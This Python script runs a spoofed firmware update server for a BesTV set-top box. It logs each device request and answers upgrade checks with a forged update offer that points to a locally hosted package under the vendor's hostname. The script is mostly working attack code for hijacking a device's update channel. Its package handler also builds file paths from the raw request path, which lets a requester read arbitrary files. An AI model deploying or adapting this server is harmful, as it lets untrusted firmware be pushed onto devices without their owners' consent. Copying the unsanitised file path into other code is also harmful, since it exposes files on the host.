#!/usr/bin/env python3
import sys, time, hashlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LOG = open("~/tvbox/ssrf/ota_requests.log", "ab", buffering=0)
PKG = "~/tvbox/ssrf/pkg"

def log(b):
    LOG.write(b)

def jbody(rc, rm, mode=0, ver="", fhash="", soft="", size=0, code="", url="", desc=""):
    return ('{\n"Response":{\n"Header":{\n"RC":%d,\n"RM":"%s"\n},\n"Body":{\n'
            '"UpgradeMode":%d,\n"LastedVersion":"%s",\n"FileHash":"%s",\n"CompressType":2,\n'
            '"SoftName":"%s",\n"SoftSize":%d,\n"SoftCode":"%s",\n"FileURL":"%s",\n'
            '"DescURL":"",\n"DescHash":"",\n"DescFileType":0,\n"Desc":"%s"\n}\n}\n}\n'
            % (rc, rm, mode, ver, fhash, soft, size, code, url, desc)).encode()

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def reply(self, code, body, ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def handle_one(self, method):
        ln = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(ln) if ln else b""
        hdrs = b"".join(f"{k}: {v}\r\n".encode() for k, v in self.headers.items())
        log(f"\n===== {time.strftime('%H:%M:%S')} {method} {self.path} from {self.client_address[0]} =====\n".encode()
            + hdrs + b"\n--body--\n" + body[:4000])
        sys.stderr.write(f"{method} {self.path} {self.client_address[0]}\n")
        p = self.path.lower()
        if "/pkg/" in p:
            try:
                fn = self.path.split("/pkg/")[1].split("?")[0] or "update.zip"
                data = open(PKG + "/" + fn, "rb").read()
                rng = self.headers.get("Range")
                if rng and rng.startswith("bytes="):
                    spec = rng[6:]
                    s, _, e = (spec.split(",")[0]).partition("-")
                    start = int(s) if s else 0
                    end = int(e) if e else len(data) - 1
                    end = min(end, len(data) - 1)
                    chunk = data[start:end + 1]
                    if start == 0 and end >= len(data) - 1:
                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.send_header("Accept-Ranges", "bytes")
                        self.send_header("Content-Length", str(len(data)))
                        self.end_headers()
                        self.wfile.write(data)
                        return
                    self.send_response(206)
                    self.send_header("Content-Type", "application/octet-stream")
                    self.send_header("Content-Range", f"bytes {start}-{end}/{len(data)}")
                    self.send_header("Accept-Ranges", "bytes")
                    self.send_header("Content-Length", str(len(chunk)))
                    self.end_headers()
                    self.wfile.write(chunk)
                else:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/octet-stream")
                    self.send_header("Accept-Ranges", "bytes")
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
            except Exception as e:
                self.reply(404, str(e).encode())
            return
        if "upgradeos" in p:
            # long-form offer shape (the one the client accepted once, with a
            # comment-less JAR-only package)
            import os
            fn = "BesTV_R1200-C_QHHZ_3.0.2.0.zip"
            fp = PKG + "/" + fn
            sz = os.path.getsize(fp)
            md5 = hashlib.md5(open(fp, "rb").read()).hexdigest().upper()
            self.reply(200, jbody(0, "发现新版本", 1, "BesTV_R1200-C_QHHZ_3.0.2.0", md5,
                                  f"【R1200-C】 {fn}", sz, "OS2714",
                                  f"http://qhup.bestv.com.cn/pkg/{fn}", "优化系统性能，提升稳定性"))
        elif "upgradeinside" in p:
            self.reply(200, jbody(0, "没有升级计划"))
        else:
            self.reply(200, jbody(0, "没有升级计划"))

    def do_GET(self):  self.handle_one("GET")
    def do_POST(self): self.handle_one("POST")
    def do_HEAD(self): self.handle_one("HEAD")

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 80
    ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()
